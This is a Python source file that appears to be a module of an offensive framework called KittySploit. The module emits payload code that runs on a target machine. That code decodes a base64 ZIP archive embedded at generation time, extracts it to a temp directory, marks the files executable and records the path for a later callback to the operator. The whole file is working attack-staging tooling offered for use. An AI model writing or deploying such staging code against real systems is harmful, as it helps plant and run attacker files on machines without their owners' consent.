#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Extract an embedded ZIP archive before callback (Python emitter)."""

from __future__ import annotations

from typing import Any, Dict

from kittysploit import *
from core.payload_generation.prestage.zip_context import resolve_zip_prestage_context


class Module(Prestage):
    PRESTAGE_ID = "extract_zip"

    __info__ = {
        "name": "Extract Embedded ZIP (Python)",
        "description": "Extract a ZIP archive embedded at generation time before callback",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "platform": Platform.MULTI,
        "languages": ["python"],
        "dependencies": [],
        "tags": ["prestage", "offline", "zip", "staging", "python"],
    }

    zip_file = OptFile("", "ZIP archive on operator machine (embedded during generate)", False)
    extract_to = OptString("", "Destination directory on target (default: temp dir)", False)
    cleanup_zip = OptBool(True, "Remove extracted tree on failure after partial extract", False, True)
    chmod_exec = OptBool(True, "Mark extracted files executable (Unix)", False, True)

    def generate_python(self, context: Dict[str, Any] = None) -> str:
        ctx = resolve_zip_prestage_context(self, context)
        zip_b64 = str(ctx.get("zip_b64") or "").strip()
        if not zip_b64:
            return "pass  # extract_zip: set prestage_archive on payload"

        extract_to = str(ctx.get("extract_to") or "").strip()
        cleanup = bool(ctx.get("cleanup_zip"))
        chmod_exec = bool(ctx.get("chmod_exec"))

        return f'''
import base64 as _b64
import io as _io
import os as _os
import shutil as _shutil
import stat as _stat
import tempfile as _tempfile
import zipfile as _zipfile

_zip_b64 = "{zip_b64}"
_extract_root = {extract_to!r}
_cleanup = {bool(cleanup)}
_chmod_exec = {bool(chmod_exec)}

try:
    _raw = _b64.b64decode(_zip_b64)
    if not _extract_root:
        _extract_root = _tempfile.mkdtemp(prefix="ks_")
    else:
        _os.makedirs(_extract_root, exist_ok=True)
    with _zipfile.ZipFile(_io.BytesIO(_raw), "r") as _zf:
        for _info in _zf.infolist():
            _dest = _os.path.join(_extract_root, _info.filename)
            if _info.is_dir() or _info.filename.endswith("/"):
                _os.makedirs(_dest, exist_ok=True)
                continue
            _parent = _os.path.dirname(_dest)
            if _parent:
                _os.makedirs(_parent, exist_ok=True)
            with _zf.open(_info, "r") as _src, open(_dest, "wb") as _out:
                _out.write(_src.read())
            if _chmod_exec:
                try:
                    _mode = _stat.S_IRUSR | _stat.S_IWUSR | _stat.S_IXUSR
                    _os.chmod(_dest, _mode)
                except Exception:
                    pass
    globals()["_kitty_extract_dir"] = _extract_root
except Exception:
    if _cleanup and _extract_root and _os.path.isdir(_extract_root):
        try:
            _shutil.rmtree(_extract_root, ignore_errors=True)
        except Exception:
            pass
'''.strip()
